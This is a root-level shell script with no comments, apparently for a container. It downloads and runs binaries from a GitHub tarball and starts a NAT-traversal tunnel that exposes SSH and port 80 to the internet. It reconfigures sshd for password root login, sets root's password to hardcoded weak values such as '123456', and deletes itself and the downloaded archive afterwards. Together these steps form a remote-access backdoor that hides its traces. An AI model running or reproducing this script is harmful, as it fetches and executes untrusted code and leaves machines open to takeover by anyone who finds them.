cd /root
curl -O https://raw.githubusercontent.com/zhouzhenqi/file/master/ct2-h.tar.xz
sleep 1
xz -z -d ct2-h.tar.xz
tar -xvf ct2-h.tar
mv myweb/ /etc/
chmod +x /etc/myweb/*
cd /etc/myweb/


echo "13.107.136.9 209zzq-my.sharepoint.com" >> /etc/hosts
name=$(cat /etc/hostname)
b=$(($RANDOM%10))
s=$(($RANDOM%10))
g=$(($RANDOM%10))

a=$(($RANDOM%5))
e=$(($RANDOM%10))

puport="$a$b$s$g$e"
echo $puport

pport="$b$s$g"
echo $pport

./nm -4 -s turn.cloudflare.com -h google.com -b $puport -e /etc/myweb/port.sh -k 30 -d
sleep 1

sed -i "s/http-80/6"$pport"-80/g" /etc/myweb/myjs.toml
sed -i "s/tcp-22/"$name"-22/g" /etc/myweb/myjs.toml
sed -i "s/p2p_ssh/"$name"-p2pssh/g" /etc/myweb/myjs.toml
sed -i "s/p2p_80/"$name"-p2p80/g" /etc/myweb/myjs.toml
sed -i "s/6080/6"$pport"/g" /etc/myweb/myjs.toml
sed -i "s/52222/12"$pport"/g" /etc/myweb/myjs.toml

/etc/myweb/runct.sh &
/etc/myweb/myjs -c /etc/myweb/myjs.toml &

mkdir /etc/yum.repos.d/backup && mv /etc/yum.repos.d/*.repo /etc/yum.repos.d/backup/
curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.vmshell.com/repo/CentOS-Base.repo
yum clean all && yum makecache
yum-config-manager --disable kubernetes
yum install passwd openssl openssh-server -y
ssh-keygen -q -t rsa -b 2048 -f /etc/ssh/ssh_host_rsa_key -N ''
ssh-keygen -q -t ecdsa -f /etc/ssh/ssh_host_ecdsa_key -N ''
ssh-keygen -t dsa -f /etc/ssh/ssh_host_ed25519_key -N ''
sed -i "s/#UsePrivilegeSeparation.*/UsePrivilegeSeparation no/g" /etc/ssh/sshd_config
sed -i "s/UsePAM.*/UsePAM no/g" /etc/ssh/sshd_config
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
echo -e "Docker@1qaz\nDocker@1qaz" | (passwd root) 
echo 123456 | passwd --stdin root
killall sshd
/usr/sbin/sshd -D &
yum clean all
rm -rf /root/runga2-h.sh 
rm -rf /root/ct2-h.tar


